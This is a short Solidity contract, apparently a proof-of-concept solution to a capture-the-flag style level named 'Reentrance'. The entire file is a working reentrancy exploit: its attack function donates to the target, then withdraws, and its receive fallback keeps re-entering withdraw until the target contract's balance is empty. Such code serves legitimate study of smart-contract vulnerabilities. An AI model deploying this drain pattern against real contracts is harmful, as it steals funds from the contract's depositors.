// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instances/Ilevel10.sol";

contract POCReentrance {
    Reentrance reentrance;
    uint256 amount = 0.001 ether;

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(amount);
        }
    }
}
